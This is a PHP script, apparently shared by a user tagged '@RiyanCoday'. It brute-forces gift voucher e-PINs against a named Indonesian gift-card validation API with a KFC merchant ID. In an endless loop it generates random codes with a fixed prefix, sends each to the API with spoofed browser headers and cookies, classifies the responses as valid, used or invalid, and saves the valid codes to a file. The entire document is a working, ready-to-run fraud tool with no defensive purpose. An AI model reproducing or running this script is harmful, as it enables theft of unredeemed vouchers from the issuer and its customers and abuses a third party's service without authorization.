<?php
// @RiyanCoday //
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
class curl {
	var $ch, $agent, $error, $info, $cookiefile, $savecookie;	
	function curl() {
		$this->ch = curl_init();
		curl_setopt ($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36');
		curl_setopt ($this->ch, CURLOPT_HEADER, 1);
		curl_setopt ($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($this->ch, CURLOPT_FOLLOWLOCATION,true);
		curl_setopt ($this->ch, CURLOPT_TIMEOUT, 30);
		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,30);
	}
	function header($header) {
		curl_setopt ($this->ch, CURLOPT_HTTPHEADER, $header);
	}
	function timeout($time){
		curl_setopt ($this->ch, CURLOPT_TIMEOUT, $time);
		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,$time);
	}
	function http_code() {
		return curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
	}
	function error() {
		return curl_error($this->ch);
	}
	function ssl($veryfyPeer, $verifyHost){
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, $veryfyPeer);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, $verifyHost);
	}
	function post($url, $data) {
		curl_setopt($this->ch, CURLOPT_POST, 1);	
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);
		return $this->getPage($url);
	}
	function data($url, $data, $hasHeader=true, $hasBody=true) {
		curl_setopt ($this->ch, CURLOPT_POST, 1);
		curl_setopt ($this->ch, CURLOPT_POSTFIELDS, http_build_query($data));
		return $this->getPage($url, $hasHeader, $hasBody);
	}
	function get($url, $hasHeader=true, $hasBody=true) {
		curl_setopt ($this->ch, CURLOPT_POST, 0);
		return $this->getPage($url, $hasHeader, $hasBody);
	}	
	function getPage($url, $hasHeader=true, $hasBody=true) {
		curl_setopt($this->ch, CURLOPT_HEADER, 0);
		curl_setopt($this->ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
		curl_setopt ($this->ch, CURLOPT_URL, $url);
		$data = curl_exec ($this->ch);
		$this->error = curl_error ($this->ch);
		$this->info = curl_getinfo ($this->ch);
		return $data;
	}
}

$curl = new curl();
$curl->ssl(0, 2);
$headers = array();
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36";
$headers[] = "Content-Type: application/json; charset=utf-8";
$headers[] = "Referer: http://sepin.giftn.co.id/pop/information?p=57MDEPyU8qKg8wftWRciCw%3d%3d";
$headers[] = "Accept-Encoding: gzip, deflate";
$headers[] = "Accept-Language: en-US,en;q=0.9";
$headers[] = "Cookie: _ga=GA1.3.292748761.1542860936; _gid=GA1.3.1479722079.1542860936; _gat_gtag_UA_83926611_3=1";
$curl->header($headers);	
$i=0;
while (true) {
	$code = 811;
	$tod = ''.$code.''.rand(100000000,999999999).'';
	$page = $curl->get('http://sepin.giftn.co.id/api/EPin/AuthEPin?cid=GFN0268&wid=kfc&epin='.$tod.'');
$c = json_decode($page);
$ec = $c->errorcode; // E0005 = die || E0000 = live || E0006 = use
$msg = $c->rst_msg; 
$in = $c->prd_info->gds_name; 
if($ec == "E0000"){
		echo ''.$i.'.VALID => '.$tod.' | '.$in.'';
							echo "\n";
		$data =  "".$tod." \r\n";
		$fh = fopen("cdy-".$code.".txt", "a");
		fwrite($fh, $data);
		fclose($fh);
}elseif($ec == "E0006"){
		echo ''.$i.'.USED => '.$tod.' | '.$in.'';
								echo "\n";
}elseif($ec == "E0005"){
		echo ''.$i.'.INVALID => '.$tod.' | '.$msg.'';
								echo "\n";
}else{
			echo ''.$i.'.ERROR => '.$tod.'';
								echo "\n";
}
		flush();
		ob_flush();
 $i++;
}
?>
